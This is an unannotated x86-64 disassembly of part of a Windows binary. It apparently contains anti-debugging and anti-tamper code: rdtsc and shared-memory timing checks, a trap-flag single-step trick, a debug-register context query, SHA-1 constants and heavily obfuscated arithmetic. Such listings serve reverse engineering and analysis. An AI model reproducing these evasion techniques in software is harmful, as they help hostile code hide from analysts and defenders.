   140043946:	xor    rax,r8
   140043949:	movabs r8,0x79ca1cd2f36bd757
   140043953:	imul   r15,r8
   140043957:	add    rcx,r11
   14004395a:	mov    r8,r15
   14004395d:	jmp    0x140043926
   14004395f:	lea    rcx,[rsi*4+0x4]
   140043967:	xor    r15d,r15d
   14004396a:	cmp    rcx,QWORD PTR [rbp+0x1168]
   140043971:	ja     0x140043986
   140043973:	lea    rcx,[rsi*4+0x0]
   14004397b:	mov    rdx,QWORD PTR [rbp+0x1140]
   140043982:	mov    r15d,DWORD PTR [rdx+rcx*1]
   140043986:	xor    r8,rax
   140043989:	mov    rax,r8
   14004398c:	shr    rax,0x18
   140043990:	xor    edx,edx
   140043992:	div    r12d
   140043995:	lea    ecx,[rdx+0x1]
   140043998:	ror    r15d,cl
   14004399b:	mov    rax,r8
   14004399e:	shr    rax,0x10
   1400439a2:	mov    rcx,r8
   1400439a5:	shr    rcx,0x28
   1400439a9:	xor    ecx,eax
   1400439ab:	xor    r8d,ecx
   1400439ae:	xor    r8d,r15d
   1400439b1:	mov    rax,r8
   1400439b4:	xor    edx,edx
   1400439b6:	div    QWORD PTR [rbp+0x1178]
   1400439bd:	mov    QWORD PTR [rbp+rsi*8+0xd10],rdx
   1400439c5:	inc    rsi
   1400439c8:	jmp    0x140043905
   1400439cd:	and    QWORD PTR [rbp+0xf80],0x0
   1400439d5:	lea    rsi,[rbp+0x1060]
   1400439dc:	mov    QWORD PTR [rsi],r14
   1400439df:	mov    QWORD PTR [rsi+0x8],rdi
   1400439e3:	mov    QWORD PTR [rsi+0x10],0x8
   1400439eb:	and    QWORD PTR [rsi+0x18],0x0
   1400439f0:	mov    rcx,rsi
   1400439f3:	call   0x14003ba96
   1400439f8:	test   rdx,rdx
   1400439fb:	je     0x140043a12
   1400439fd:	cmp    rax,0x7
   140043a01:	ja     0x14004a57a
   140043a07:	mov    cl,BYTE PTR [rdx]
   140043a09:	mov    BYTE PTR [rbp+rax*1+0xf80],cl
   140043a10:	jmp    0x1400439f0
   140043a12:	lea    rdi,[rbp+0x38]
   140043a16:	lea    rsi,[rbp+0xd10]
   140043a1d:	mov    ecx,0x80
   140043a22:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   140043a24:	mov    rsi,QWORD PTR [rbp+0xf80]
   140043a2b:	mov    rcx,rbx
   140043a2e:	mov    rdx,r14
   140043a31:	call   0x14006f7f7
   140043a36:	mov    rcx,QWORD PTR [rbp+0x1160]
   140043a3d:	mov    rdx,QWORD PTR [rbp+0x1140]
   140043a44:	call   0x14006f7f7
   140043a49:	mov    QWORD PTR [rbp+0x1d0],rsi
   140043a50:	call   0x140064168
   140043a55:	cmp    rax,0x1
   140043a59:	jne    0x14003cad1
   140043a5f:	mov    rsi,rdx
   140043a62:	call   0x1400641b3
   140043a67:	mov    rcx,rsi
   140043a6a:	call   0x140064146
   140043a6f:	cmp    rax,0x1
   140043a73:	jne    0x14003cad1
   140043a79:	mov    r8,rdx
   140043a7c:	lea    r9,[rip+0x20730]        # 0x1400641b3
   140043a83:	sub    r9d,esi
   140043a86:	lea    rdi,[rbp+0x7d0]
   140043a8d:	mov    rcx,rdi
   140043a90:	mov    rdx,rsi
   140043a93:	call   0x1400665bf
   140043a98:	mov    rax,QWORD PTR [rdi]
   140043a9b:	mov    QWORD PTR [rbp+0x388],rax
   140043aa2:	neg    rax
   140043aa5:	jo     0x14003cad1
   140043aab:	mov    rax,QWORD PTR [rbp+0x7d8]
   140043ab2:	mov    QWORD PTR [rbp+0x4f8],rax
   140043ab9:	mov    rsi,QWORD PTR [rbp+0x7e0]
   140043ac0:	call   0x140064168
   140043ac5:	cmp    rax,0x1
   140043ac9:	jne    0x140043bdd
   140043acf:	mov    rdi,rdx
   140043ad2:	call   0x1400641b3
   140043ad7:	mov    rcx,rdi
   140043ada:	call   0x140064146
   140043adf:	cmp    rax,0x1
   140043ae3:	jne    0x140043bdd
   140043ae9:	mov    r8,rdx
   140043aec:	lea    r9,[rip+0x206c0]        # 0x1400641b3
   140043af3:	sub    r9d,edi
   140043af6:	lea    rbx,[rbp+0x7d0]
   140043afd:	mov    rcx,rbx
   140043b00:	mov    rdx,rdi
   140043b03:	call   0x140066aac
   140043b08:	cmp    BYTE PTR [rbx],0x0
   140043b0b:	je     0x140043bdd
   140043b11:	mov    rax,QWORD PTR [rbp+0x7e0]
   140043b18:	mov    rcx,QWORD PTR [rbp+0x7d8]
   140043b1f:	add    rcx,rdi
   140043b22:	mov    QWORD PTR [rbp+0xd08],rcx
   140043b29:	mov    QWORD PTR [rbp+0x390],rcx
   140043b30:	mov    QWORD PTR [rbp+0x798],rax
   140043b37:	mov    QWORD PTR [rbp+0x398],rax
   140043b3e:	lea    rcx,[rbp+0xcc0]
   140043b45:	mov    QWORD PTR [rbp+0x1160],rcx
   140043b4c:	mov    rdx,QWORD PTR [rbp+0x4f8]
   140043b53:	mov    r8,rsi
   140043b56:	call   0x140063bc8
   140043b5b:	push   0x11
   140043b5d:	pop    rax
   140043b5e:	mov    QWORD PTR [rbp+0x6b8],0x0
   140043b69:	dec    eax
   140043b6b:	je     0x140043b96
   140043b6d:	mov    r8d,DWORD PTR ds:0x7ffe000c
   140043b75:	mov    ecx,r8d
   140043b78:	mov    edx,DWORD PTR ds:0x7ffe0008
   140043b7f:	shl    r8,0x20
   140043b83:	or     r8,rdx
   140043b86:	mov    QWORD PTR [rbp+0x6b8],r8
   140043b8d:	cmp    ecx,DWORD PTR ds:0x7ffe0010
   140043b94:	jne    0x140043b69
   140043b96:	call   0x140065f8e
   140043b9b:	mov    QWORD PTR [rbp+0x5f8],rax
   140043ba2:	rdtsc
   140043ba4:	shl    rdx,0x20
   140043ba8:	or     rdx,rax
   140043bab:	mov    QWORD PTR [rbp+0x7a0],rdx
   140043bb2:	and    QWORD PTR [rbp+0x680],0x0
   140043bba:	xor    eax,eax
   140043bbc:	cmp    rax,0x40
   140043bc0:	je     0x140043bf0
   140043bc2:	mov    QWORD PTR [rbp+rax*1+0x7d0],0x1
   140043bce:	and    QWORD PTR [rbp+rax*1+0x7d8],0x0
   140043bd7:	add    rax,0x10
   140043bdb:	jmp    0x140043bbc
   140043bdd:	mov    rcx,QWORD PTR [rbp+0x388]
   140043be4:	mov    rdx,QWORD PTR [rbp+0x4f8]
   140043beb:	jmp    0x14003cacc
   140043bf0:	lea    rax,[rbp+0x7d4]
   140043bf7:	movups xmm0,XMMWORD PTR [rax+0xc]
   140043bfb:	movups xmm1,XMMWORD PTR [rax+0x1c]
   140043bff:	movups xmm2,XMMWORD PTR [rax+0x2c]
   140043c03:	movups XMMWORD PTR [rbp+0x530],xmm2
   140043c0a:	movups XMMWORD PTR [rbp+0x520],xmm1
   140043c11:	movups XMMWORD PTR [rbp+0x510],xmm0
   140043c18:	mov    rax,QWORD PTR [rbp+0x4f8]
   140043c1f:	mov    QWORD PTR [rbp+0x500],rax
   140043c26:	mov    QWORD PTR [rbp+0x508],rsi
   140043c2d:	lea    rax,[rsi+0x11]
   140043c31:	mov    rdx,rax
   140043c34:	shr    rdx,0x6
   140043c38:	and    eax,0x3f
   140043c3b:	push   0x1
   140043c3d:	pop    rcx
   140043c3e:	cmp    rax,rcx
   140043c41:	sbb    rdx,0xffffffffffffffff
   140043c45:	mov    QWORD PTR [rbp+0x540],rcx
   140043c4c:	mov    QWORD PTR [rbp+0x380],rdx
   140043c53:	shl    rdx,0x6
   140043c57:	sub    rdx,rsi
   140043c5a:	mov    QWORD PTR [rbp+0x708],rdx
   140043c61:	add    rdx,0xffffffffffffffef
   140043c65:	lea    rax,[rsi*8+0x40]
   140043c6d:	bswap  rax
   140043c70:	lea    r8,[rbp+0x500]
   140043c77:	mov    QWORD PTR [rbp+0x1060],r8
   140043c7e:	mov    QWORD PTR [rbp+0x1068],rcx
   140043c85:	xorps  xmm6,xmm6
   140043c88:	movups XMMWORD PTR [rbp+0x1070],xmm6
   140043c8f:	lea    rcx,[rbp+0xcc0]
   140043c96:	mov    QWORD PTR [rbp+0x1080],rcx
   140043c9d:	lea    rcx,[rbp+0x230]
   140043ca4:	mov    QWORD PTR [rbp+0x1088],rcx
   140043cab:	lea    rcx,[rbp+0x390]
   140043cb2:	mov    QWORD PTR [rbp+0x1090],rcx
   140043cb9:	lea    rcx,[rbp+0x680]
   140043cc0:	mov    QWORD PTR [rbp+0x1098],rcx
   140043cc7:	mov    rcx,QWORD PTR [rbp+0x7a0]
   140043cce:	mov    QWORD PTR [rbp+0x10a0],rcx
   140043cd5:	mov    rcx,QWORD PTR [rbp+0x5f8]
   140043cdc:	mov    QWORD PTR [rbp+0x10a8],rcx
   140043ce3:	mov    rcx,QWORD PTR [rbp+0x6b8]
   140043cea:	mov    QWORD PTR [rbp+0x10b0],rcx
   140043cf1:	movups XMMWORD PTR [rbp+0x10b8],xmm6
   140043cf8:	and    QWORD PTR [rbp+0x10c8],0x0
   140043d00:	mov    QWORD PTR [rbp+0x7a8],rdx
   140043d07:	mov    QWORD PTR [rbp+0x10d0],rdx
   140043d0e:	mov    QWORD PTR [rbp+0x10d8],rax
   140043d15:	mov    DWORD PTR [rbp+0x7b4],0x67452301
   140043d1f:	mov    eax,0xefcdab89
   140043d24:	mov    QWORD PTR [rbp+0x6d0],rax
   140043d2b:	mov    DWORD PTR [rbp+0x3f8],0x98badcfe
   140043d35:	mov    eax,0x10325476
   140043d3a:	mov    QWORD PTR [rbp+0x6a8],rax
   140043d41:	mov    DWORD PTR [rbp+0x6e4],0xc3d2e1f0
   140043d4b:	mov    QWORD PTR [rbp+0x6f8],0x0
   140043d56:	mov    QWORD PTR [rbp+0x4d8],0x0
   140043d61:	xor    edi,edi
   140043d63:	xor    esi,esi
   140043d65:	mov    QWORD PTR [rbp+0x6a0],0x0
   140043d70:	mov    rax,QWORD PTR [rbp+0x6a0]
   140043d77:	cmp    rax,QWORD PTR [rbp+0x380]
   140043d7e:	je     0x140048154
   140043d84:	inc    QWORD PTR [rbp+0x6a0]
   140043d8b:	movaps XMMWORD PTR [rbp+0x740],xmm6
   140043d92:	movaps XMMWORD PTR [rbp+0x730],xmm6
   140043d99:	movaps XMMWORD PTR [rbp+0x720],xmm6
   140043da0:	movaps XMMWORD PTR [rbp+0x710],xmm6
   140043da7:	mov    QWORD PTR [rbp+0xf60],0x0
   140043db2:	mov    rax,QWORD PTR [rbp+0xf60]
   140043db9:	cmp    rax,0x40
   140043dbd:	je     0x140047f43
   140043dc3:	mov    QWORD PTR [rbp+0x7c0],rax
   140043dca:	inc    rax
   140043dcd:	mov    QWORD PTR [rbp+0xf60],rax
   140043dd4:	test   rsi,rsi
   140043dd7:	sete   cl
   140043dda:	mov    rax,QWORD PTR [rbp+0x508]
   140043de1:	mov    rdx,rdi
   140043de4:	test   cl,0x1
   140043de7:	je     0x140043e1f
   140043de9:	xor    edi,edi
   140043deb:	mov    ecx,0x0
   140043df0:	cmp    rdx,rax
   140043df3:	jae    0x140043de1
   140043df5:	and    QWORD PTR [rbp+0x1070],0x0
   140043dfd:	mov    rax,QWORD PTR [rbp+0x500]
   140043e04:	mov    al,BYTE PTR [rax+rdx*1]
   140043e07:	inc    rdx
   140043e0a:	mov    QWORD PTR [rbp+0x3e8],rdx
   140043e11:	mov    QWORD PTR [rbp+0x1078],rdx
   140043e18:	xor    esi,esi
   140043e1a:	jmp    0x140047b27
   140043e1f:	mov    QWORD PTR [rbp+0x1070],0x1
   140043e2a:	mov    QWORD PTR [rbp+0x3e8],rdx
   140043e31:	mov    QWORD PTR [rbp+0x1078],rdx
   140043e38:	and    QWORD PTR [rbp+0x1080],0x0
   140043e40:	cmp    QWORD PTR [rbp+0x1160],0x0
   140043e48:	je     0x140047a6b
   140043e4e:	rdtsc
   140043e50:	mov    rsi,rdx
   140043e53:	shl    rsi,0x20
   140043e57:	or     rsi,rax
   140043e5a:	call   0x140065f8e
   140043e5f:	mov    rdi,rax
   140043e62:	push   0x11
   140043e64:	pop    rax
   140043e65:	xor    ebx,ebx
   140043e67:	dec    eax
   140043e69:	je     0x140043e8b
   140043e6b:	mov    ebx,DWORD PTR ds:0x7ffe000c
   140043e72:	mov    ecx,ebx
   140043e74:	mov    edx,DWORD PTR ds:0x7ffe0008
   140043e7b:	shl    rbx,0x20
   140043e7f:	or     rbx,rdx
   140043e82:	cmp    ecx,DWORD PTR ds:0x7ffe0010
   140043e89:	jne    0x140043e67
   140043e8b:	sub    rsi,QWORD PTR [rbp+0x7a0]
   140043e92:	sub    rdi,QWORD PTR [rbp+0x5f8]
   140043e99:	call   0x140066006
   140043e9e:	sub    rbx,QWORD PTR [rbp+0x6b8]
   140043ea5:	mov    rcx,rsi
   140043ea8:	mov    rdx,rdi
   140043eab:	mov    r8,rax
   140043eae:	mov    r9,rbx
   140043eb1:	call   0x14003adfb
   140043eb6:	mov    DWORD PTR [rbp+0xcb0],eax
   140043ebc:	mov    rax,QWORD PTR [rbp+0x1160]
   140043ec3:	mov    rsi,QWORD PTR [rax]
   140043ec6:	lea    rcx,[rbp+0xd10]
   140043ecd:	call   0x140066080
   140043ed2:	cmp    BYTE PTR [rbp+0xd10],0x0
   140043ed9:	lea    rax,[rbp+0xd18]
   140043ee0:	jne    0x140043f5b
   140043ee2:	mov    ecx,0x4d0
   140043ee7:	xor    eax,eax
   140043ee9:	lea    rbx,[rbp+0x7d0]
   140043ef0:	mov    rdi,rbx
   140043ef3:	rep stos BYTE PTR [rdi],al
   140043ef5:	mov    DWORD PTR [rbp+0x800],0x100010
   140043eff:	call   QWORD PTR [rip+0x50743]        # 0x140094648
   140043f05:	mov    rcx,rax
   140043f08:	mov    rdx,rbx
   140043f0b:	call   QWORD PTR [rip+0x507d7]        # 0x1400946e8
   140043f11:	test   eax,eax
   140043f13:	je     0x140043f4b
   140043f15:	movups xmm0,XMMWORD PTR [rbp+0x818]
   140043f1c:	movups xmm1,XMMWORD PTR [rbp+0x828]
   140043f23:	mov    rax,QWORD PTR [rbp+0x840]
   140043f2a:	movups XMMWORD PTR [rbp+0xd18],xmm0
   140043f31:	movups XMMWORD PTR [rbp+0xd28],xmm1
   140043f38:	mov    QWORD PTR [rbp+0xd38],rax
   140043f3f:	push   0x1
   140043f41:	pop    rcx
   140043f42:	lea    rax,[rbp+0xd18]
   140043f49:	jmp    0x140043f54
   140043f4b:	xor    ecx,ecx
   140043f4d:	lea    rax,[rbp+0x7d0]
   140043f54:	mov    QWORD PTR [rbp+0xd10],rcx
   140043f5b:	and    QWORD PTR [rbp+0x7f0],0x0
   140043f63:	movaps XMMWORD PTR [rbp+0x7e0],xmm6
   140043f6a:	movaps XMMWORD PTR [rbp+0x7d0],xmm6
   140043f71:	movups xmm0,XMMWORD PTR [rax]
   140043f74:	movups xmm1,XMMWORD PTR [rax+0x10]
   140043f78:	movaps XMMWORD PTR [rbp+0xf80],xmm0
   140043f7f:	movaps XMMWORD PTR [rbp+0xf90],xmm1
   140043f86:	mov    rax,QWORD PTR [rax+0x20]
   140043f8a:	mov    QWORD PTR [rbp+0xfa0],rax
   140043f91:	lea    rcx,[rbp+0xf80]
   140043f98:	mov    rdx,rsi
   140043f9b:	call   0x140063b2a
   140043fa0:	mov    QWORD PTR [rbp+0x5d8],rax
   140043fa7:	mov    rax,QWORD PTR [rbp+0x1160]
   140043fae:	mov    rcx,QWORD PTR [rax+0x8]
   140043fb2:	rdtsc
   140043fb4:	shl    rdx,0x20
   140043fb8:	or     rdx,rax
   140043fbb:	movabs rsi,0x34af503834f2a1da
   140043fc5:	xor    rdx,rsi
   140043fc8:	movabs r15,0x406aa9c82dbf9701
   140043fd2:	imul   rdx,r15
   140043fd6:	mov    rax,rdx
   140043fd9:	shr    rax,0x1d
   140043fdd:	xor    rax,rdx
   140043fe0:	movabs r13,0xeb591050d1f713a9
   140043fea:	imul   rax,r13
   140043fee:	mov    r14,rax
   140043ff1:	shr    r14,0x20
   140043ff5:	xor    r14,rax
   140043ff8:	mov    rbx,r14
   140043ffb:	neg    rbx
   140043ffe:	add    rbx,rcx
   140044001:	call   0x140065b3f
   140044006:	mov    rcx,r14
   140044009:	xor    rcx,rsi
   14004400c:	imul   rcx,r15
   140044010:	mov    rdx,rcx
   140044013:	shr    rdx,0x1d
   140044017:	xor    rdx,rcx
   14004401a:	imul   rdx,r13
   14004401e:	mov    rsi,rdx
   140044021:	shr    rsi,0x20
   140044025:	xor    rsi,rdx
   140044028:	mov    rdx,rsi
   14004402b:	rol    rdx,0x7
   14004402f:	mov    rdi,rsi
   140044032:	rol    rdi,0x29
   140044036:	movzx  eax,al
   140044039:	add    rax,rdx
   14004403c:	mov    rcx,rdi
   14004403f:	sub    rdi,rdx
   140044042:	movabs rdx,0x38a95a1996f05387
   14004404c:	imul   rax,rdx
   140044050:	movabs r8,0xc4afc7660ecd07f6
   14004405a:	add    rax,r8
   14004405d:	add    rax,r14
   140044060:	add    rax,rbx
   140044063:	imul   rcx,rdx
   140044067:	movabs r8,0xf24f7a7152484280
   140044071:	add    rcx,r8
   140044074:	imul   rdi,rdx
   140044078:	movabs rdx,0x2d9fb30b437b3a8a
   140044082:	add    rdi,rdx
   140044085:	sub    rdi,rsi
   140044088:	sub    rdi,rcx
   14004408b:	add    rdi,rax
   14004408e:	call   0x140065e3e
   140044093:	mov    rcx,rsi
   140044096:	movabs rdx,0x1e586e515d757276
   1400440a0:	xor    rcx,rdx
   1400440a3:	imul   rcx,r15
   1400440a7:	mov    rdx,rcx
   1400440aa:	shr    rdx,0x1d
   1400440ae:	xor    rdx,rcx
   1400440b1:	imul   rdx,r13
   1400440b5:	mov    r14,rdx
   1400440b8:	shr    r14,0x20
   1400440bc:	xor    r14,rdx
   1400440bf:	mov    rdx,r14
   1400440c2:	rol    rdx,0x7
   1400440c6:	mov    r12,r14
   1400440c9:	rol    r12,0x29
   1400440cd:	movzx  eax,al
   1400440d0:	add    rax,rdx
   1400440d3:	mov    rcx,r12
   1400440d6:	sub    r12,rdx
   1400440d9:	movabs rdx,0x352fd32b93d40fa1
   1400440e3:	imul   rax,rdx
   1400440e7:	movabs r8,0x49db77743449e636
   1400440f1:	add    rax,r8
   1400440f4:	add    rax,rsi
   1400440f7:	add    rax,rdi
   1400440fa:	imul   rcx,rdx
   1400440fe:	movabs r8,0x2010276053421089
   140044108:	add    rcx,r8
   14004410b:	imul   r12,rdx
   14004410f:	movabs rdx,0xd634afec1ef82a53
   140044119:	add    r12,rdx
   14004411c:	sub    r12,r14
   14004411f:	sub    r12,rcx
   140044122:	add    r12,rax
   140044125:	call   0x140065eb3
   14004412a:	mov    rcx,r14
   14004412d:	movabs rdx,0x7d99216e928b59c6
   140044137:	xor    rcx,rdx
   14004413a:	imul   rcx,r15
   14004413e:	mov    rdx,rcx
   140044141:	shr    rdx,0x1d
   140044145:	xor    rdx,rcx
   140044148:	imul   rdx,r13
   14004414c:	mov    r15,rdx
   14004414f:	shr    r15,0x20
   140044153:	xor    r15,rdx
   140044156:	mov    rdx,r15
   140044159:	rol    rdx,0x7
   14004415d:	mov    rbx,r15
   140044160:	rol    rbx,0x29
   140044164:	movzx  eax,al
   140044167:	add    rax,rdx
   14004416a:	mov    rcx,rbx
   14004416d:	sub    rbx,rdx
   140044170:	movabs rdx,0x1522e06d579f1f85
   14004417a:	imul   rax,rdx
   14004417e:	movabs r8,0xa1439b8e0e3e9dde
   140044188:	add    rax,r8
   14004418b:	add    rax,r14
   14004418e:	add    rax,r12
   140044191:	imul   rcx,rdx
   140044195:	movabs r8,0x804aab97d81a712e
   14004419f:	add    rcx,r8
   1400441a2:	imul   rbx,rdx
   1400441a6:	movabs rdx,0xdf071009c9dbd350
   1400441b0:	add    rbx,rdx
   1400441b3:	sub    rbx,r15
   1400441b6:	sub    rbx,rcx
   1400441b9:	add    rbx,rax
   1400441bc:	mov    al,BYTE PTR [rip+0x549f6]        # 0x140098bb8
   1400441c2:	cmp    al,0x1
   1400441c4:	je     0x1400441ed
   1400441c6:	movzx  eax,al
   1400441c9:	test   eax,eax
   1400441cb:	jne    0x140044bd2
   1400441d1:	call   0x140065d51
   1400441d6:	test   rax,rax
   1400441d9:	sete   cl
   1400441dc:	inc    cl
   1400441de:	mov    BYTE PTR [rip+0x549d4],cl        # 0x140098bb8
   1400441e4:	test   rax,rax
   1400441e7:	je     0x140044bd2
   1400441ed:	movabs rax,0xd480ed632a37929a
   1400441f7:	movabs rcx,0x7fadadb490d9f40a
   140044201:	xor    rax,rcx
   140044204:	movabs rcx,0x406aa9c82dbf9701
   14004420e:	imul   rax,rcx
   140044212:	mov    rcx,rax
   140044215:	shr    rcx,0x1d
   140044219:	xor    rcx,rax
   14004421c:	movabs rax,0xeb591050d1f713a9
   140044226:	imul   rcx,rax
   14004422a:	mov    rsi,rcx
   14004422d:	shr    rsi,0x20
   140044231:	xor    rsi,rcx
   140044234:	mov    QWORD PTR [rbp+0x1180],rsi
   14004423b:	call   0x140064227
   140044240:	mov    eax,0x5b3ea749
   140044245:	xchg   DWORD PTR [rip+0x54895],eax        # 0x140098ae0
   14004424b:	mov    rcx,rsi
   14004424e:	lea    rsi,[rip+0x80]        # 0x1400442d5
   140044255:	lea    rdi,[rip+0x91]        # 0x1400442ed
   14004425c:	lea    r9,[rip+0x75]        # 0x1400442d8
   140044263:	xor    r9,rcx
   140044266:	rol    rcx,0x9
   14004426a:	lea    rax,[rip+0x6a]        # 0x1400442db
   140044271:	add    rax,rcx
   140044274:	rol    rcx,0x9
   140044278:	lea    rdx,[rip+0x5f]        # 0x1400442de
   14004427f:	xor    rdx,rcx
   140044282:	rol    rcx,0x9
   140044286:	lea    r10,[rip+0x54]        # 0x1400442e1
   14004428d:	add    r10,rcx
   140044290:	rol    rcx,0x9
   140044294:	lea    r12,[rip+0x49]        # 0x1400442e4
   14004429b:	xor    r12,rcx
   14004429e:	rol    rcx,0x9
   1400442a2:	lea    r13,[rip+0x3e]        # 0x1400442e7
   1400442a9:	add    r13,rcx
   1400442ac:	rol    rcx,0x9
   1400442b0:	lea    r14,[rip+0x33]        # 0x1400442ea
   1400442b7:	xor    r14,rcx
   1400442ba:	rol    rcx,0x9
   1400442be:	lea    r11,[rip+0x6]        # 0x1400442cb
   1400442c5:	mov    r8,r11
   1400442c8:	xor    r8,rcx
   1400442cb:	pushf
   1400442cc:	or     QWORD PTR [rsp],0x100
   1400442d4:	popf
   1400442d5:	xor    r8,r11
   1400442d8:	xor    r9,r11
   1400442db:	sub    rax,r11
   1400442de:	xor    rdx,r11
   1400442e1:	sub    r10,r11
   1400442e4:	xor    r12,r11
   1400442e7:	sub    r13,r11
   1400442ea:	xor    r14,r11
   1400442ed:	add    rdi,r11
   1400442f0:	lea    rcx,[rip+0xfffffffffffffff6]        # 0x1400442ed
   1400442f7:	xor    r11d,r11d
   1400442fa:	xchg   DWORD PTR [rip+0x547df],r11d        # 0x140098ae0
   140044301:	mov    QWORD PTR [rbp+0x7d0],r8
   140044308:	mov    r11,QWORD PTR [rbp+0x1180]
   14004430f:	mov    r8,r11
   140044312:	ror    r8,1
   140044315:	mov    QWORD PTR [rbp+0x7d8],r8
   14004431c:	mov    QWORD PTR [rbp+0x7e0],r9
   140044323:	mov    QWORD PTR [rbp+0x7e8],r11
   14004432a:	mov    QWORD PTR [rbp+0x7f0],rax
   140044331:	mov    rax,r11
   140044334:	rol    rax,0x9
   140044338:	mov    QWORD PTR [rbp+0x7f8],rax
   14004433f:	mov    QWORD PTR [rbp+0x800],rdx
   140044346:	mov    rax,r11
   140044349:	rol    rax,0x12
   14004434d:	mov    QWORD PTR [rbp+0x808],rax
   140044354:	mov    QWORD PTR [rbp+0x810],r10
   14004435b:	mov    rax,r11
   14004435e:	rol    rax,0x1b
   140044362:	mov    QWORD PTR [rbp+0x818],rax
   140044369:	mov    QWORD PTR [rbp+0x820],r12
   140044370:	mov    rax,r11
   140044373:	rol    rax,0x24
   140044377:	mov    QWORD PTR [rbp+0x828],rax
   14004437e:	mov    QWORD PTR [rbp+0x830],r13
   140044385:	mov    rax,r11
   140044388:	rol    rax,0x2d
   14004438c:	mov    QWORD PTR [rbp+0x838],rax
   140044393:	rol    r11,0x36
   140044397:	mov    QWORD PTR [rbp+0x840],r14
   14004439e:	mov    QWORD PTR [rbp+0x848],r11
   1400443a5:	mov    QWORD PTR [rbp+0x850],rdi
   1400443ac:	add    rcx,rcx
   1400443af:	mov    QWORD PTR [rbp+0x858],rcx
   1400443b6:	mov    BYTE PTR [rip+0x546d1],0x0        # 0x140098a8e
   1400443bd:	push   0x8
   1400443bf:	pop    rax
   1400443c0:	movabs rcx,0xd874c4a5ad678387
   1400443ca:	movabs rdi,0x406aa9c82dbf9701
   1400443d4:	movabs r14,0xeb591050d1f713a9
   1400443de:	cmp    rax,0x98
   1400443e4:	je     0x1400444c4
   1400443ea:	mov    rdx,r15
   1400443ed:	xor    rdx,rcx
   1400443f0:	imul   rdx,rdi
   1400443f4:	mov    r8,rdx
   1400443f7:	shr    r8,0x1d
   1400443fb:	xor    r8,rdx
   1400443fe:	imul   r8,r14
   140044402:	mov    rdx,r8
   140044405:	shr    rdx,0x20
   140044409:	xor    rdx,r8
   14004440c:	mov    r8,rcx
   14004440f:	movabs r9,0x629eef0eeda7e1b9
   140044419:	xor    r8,r9
   14004441c:	imul   r8,rdi
   140044420:	mov    r10,r8
   140044423:	shr    r10,0x1d
   140044427:	xor    r10,r8
   14004442a:	imul   r10,r14
   14004442e:	mov    r9,r10
   140044431:	shr    r9,0x20
   140044435:	xor    r9,r10
   140044438:	mov    r10,rdx
   14004443b:	rol    r10,0x7
   14004443f:	or     r9,0x1
   140044443:	mov    r11,rdx
   140044446:	rol    r11,0x29
   14004444a:	add    r10,rcx
   14004444d:	mov    r8,QWORD PTR [rbp+rax*1+0x7c8]
   140044455:	add    r8,r10
   140044458:	imul   r8,r9
   14004445c:	add    r8,r15
   14004445f:	add    r8,rbx
   140044462:	mov    rbx,rcx
   140044465:	rol    rbx,0x20
   140044469:	movabs r15,0x6161c4ba7c2419b8
   140044473:	xor    rbx,r15
   140044476:	lea    rsi,[r11+rbx*1]
   14004447a:	sub    rbx,r10
   14004447d:	add    rsi,QWORD PTR [rbp+rax*1+0x7d0]
   140044485:	add    rbx,r11
   140044488:	imul   rsi,r9
   14004448c:	imul   rbx,r9
   140044490:	sub    rbx,rdx
   140044493:	sub    rbx,rsi
   140044496:	add    rbx,r8
   140044499:	xor    rcx,r15
   14004449c:	imul   rcx,rdi
   1400444a0:	mov    r8,rcx
   1400444a3:	shr    r8,0x1d
   1400444a7:	xor    r8,rcx
   1400444aa:	imul   r8,r14
   1400444ae:	mov    rcx,r8
   1400444b1:	shr    rcx,0x20
   1400444b5:	xor    rcx,r8
   1400444b8:	add    rax,0x10
   1400444bc:	mov    r15,rdx
   1400444bf:	jmp    0x1400443de
   1400444c4:	add    r15,rbx
   1400444c7:	mov    rcx,r15
   1400444ca:	call   0x140063e18
   1400444cf:	mov    QWORD PTR [rbp+0x700],rax
   1400444d6:	call   0x140064168
   1400444db:	cmp    rax,0x1
   1400444df:	jne    0x1400445ab
   1400444e5:	mov    rsi,rdx
   1400444e8:	mov    rcx,rdx
   1400444eb:	call   0x140064146
   1400444f0:	cmp    rax,0x1
   1400444f4:	jne    0x1400445ab
   1400444fa:	mov    rbx,rdx
   1400444fd:	lea    rcx,[rbp+0x7d0]
   140044504:	mov    rdx,rsi
   140044507:	mov    r8,rbx
   14004450a:	call   0x140066261
   14004450f:	mov    rax,QWORD PTR [rbp+0x7d0]
   140044516:	mov    QWORD PTR [rbp+0x1140],rax
   14004451d:	neg    rax
   140044520:	jo     0x1400445ab
   140044526:	mov    r15,QWORD PTR [rbp+0x7d8]
   14004452d:	imul   rdi,QWORD PTR [rbp+0x7e0],0x1c
   140044535:	add    rdi,r15
   140044538:	mov    QWORD PTR [rbp+0xf78],r15
   14004453f:	cmp    r15,rdi
   140044542:	je     0x140044598
   140044544:	mov    r14,r15
   140044547:	add    r15,0x1c
   14004454b:	xor    edx,edx
   14004454d:	cmp    rdx,0x8
   140044551:	je     0x14004455f
   140044553:	cmp    BYTE PTR [r14+rdx*1],0x0
   140044558:	je     0x140044562
   14004455a:	inc    rdx
   14004455d:	jmp    0x14004454d
   14004455f:	push   0x8
   140044561:	pop    rdx
   140044562:	mov    rcx,r14
   140044565:	call   0x14003bca2
   14004456a:	test   al,al
   14004456c:	je     0x14004453f
   14004456e:	mov    ecx,DWORD PTR [r14+0x14]
   140044572:	mov    eax,DWORD PTR [r14+0xc]
   140044576:	cmp    ecx,eax
   140044578:	cmovb  eax,ecx
   14004457b:	mov    ecx,DWORD PTR [r14+0x8]
   14004457f:	lea    rdx,[rax+rcx*1]
   140044583:	add    rsi,rcx
   140044586:	cmp    rdx,rbx
   140044589:	mov    ecx,0x0
   14004458e:	cmovbe rcx,rsi
   140044592:	jbe    0x140047b41
   140044598:	mov    rcx,QWORD PTR [rbp+0x1140]
   14004459f:	mov    rdx,QWORD PTR [rbp+0xf78]
   1400445a6:	call   0x140066533
   1400445ab:	mov    QWORD PTR [rbp+0x1058],0x0
   1400445b6:	mov    rbx,QWORD PTR [rbp+0x230]
   1400445bd:	mov    r14,QWORD PTR [rbp+0x238]
   1400445c4:	mov    rdx,QWORD PTR [rbp+0x240]
   1400445cb:	lea    rcx,[rbp+0x640]
   1400445d2:	call   0x14006f5a7
   1400445d7:	mov    rsi,QWORD PTR [rbp+0x648]
   1400445de:	mov    rdi,QWORD PTR [rbp+0x650]
   1400445e5:	lea    rcx,[rip+0x54534]        # 0x140098b20
   1400445ec:	mov    edx,0x9394fb88
   1400445f1:	mov    r8d,0x97e5cf42
   1400445f7:	call   0x140064358
   1400445fc:	test   rax,rax
   1400445ff:	je     0x140044628
